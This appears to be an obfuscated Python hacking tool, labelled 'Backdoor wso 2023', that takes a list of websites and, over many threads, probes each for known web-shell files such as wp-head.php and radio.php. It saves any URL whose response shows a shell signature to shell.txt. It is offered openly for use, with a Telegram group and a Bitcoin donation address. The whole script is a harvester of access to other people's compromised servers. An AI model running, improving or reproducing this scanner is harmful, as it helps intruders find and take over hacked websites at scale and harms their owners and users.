G=input
F=print
import os,requests as J
from multiprocessing.dummy import Pool
from colorama import Fore as C,init
import time
from random import choice as I
import ctypes as K,sys
init(autoreset=True)
E=C.RED
D=C.WHITE
H=C.GREEN
L=C.CYAN
A=0
B=0
def M():
	try:
		if os.name=='nt':os.system('cls')
		else:os.system('clear')
	except:pass
def N(i):
	global A,B;M={'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
	try:
		N=J.session();O=['wp-head.php','radio.php','simple.php','cong.php','repeater.php']
		for P in O:
			C=i+'/'+P
			while True:
				G=N.get(C,headers=M)
				if'-rw-r--r--'in G.text or'BlackDragon'in G.text:
					B=B+1;F(H+'[*]'+D+'>> '+H+' = '+C)
					with open('shell.txt','a')as I:I.write(C+'\n');I.close()
				else:A=A+1;F(L+''+D+'['+E+'*'+D+'] '+E+' '+i+' '+D+' >>> '+E+' [Not Vuln]')
				break
	except:pass
	if os.name=='nt':K.windll.kernel32.SetConsoleTitleW('wso | Found-{} | Not Vuln-{}'.format(B,A))
	else:sys.stdout.write('\x1b]2; wso | Found-{} | Not Vuln-{}\x07'.format(B,A))
def O():
	A='\x1b[0m';B=[36,32,34,35,31,37];C='          [ + ] wso'
	for(E,D)in enumerate(C.split('\n')):sys.stdout.write('\x1b[1;%dm%s%s\n'%(I(B),D,A));time.sleep(.05)
def P():O();M();F(" \x1b[0;32m\n \n _____ ___  ______   _____  _____ \n|_   _/ _ \\ |  ___| |____ ||  _  |\n  | |/ /_\\ \\| |_        / /| |/' |\n  | ||  _  ||  _|       \\ \\|  /| |\n  | || | | || |     .___/ /\\ |_/ /\n  \\_/\\_| |_/\\_|     \\____(_)\\___/ \n  \n   Backdoor wso 2023\n  [Coded By : Professor6T9]\n  Telegram : https://t.me/teamanonforce\n  Donate(BTC): 13TVX684Err4YmkEjp2AzbYgXaftQwq6ge                                                                                                                        \n                          \n \n");A=G('\x1b[0;32mWebsite List : ');B=open(A,'r').read().splitlines();C=[list.strip()for list in B];D=Pool(int(G('\x1b[0;31mThreads : ')));D.map(N,C)
P()
G()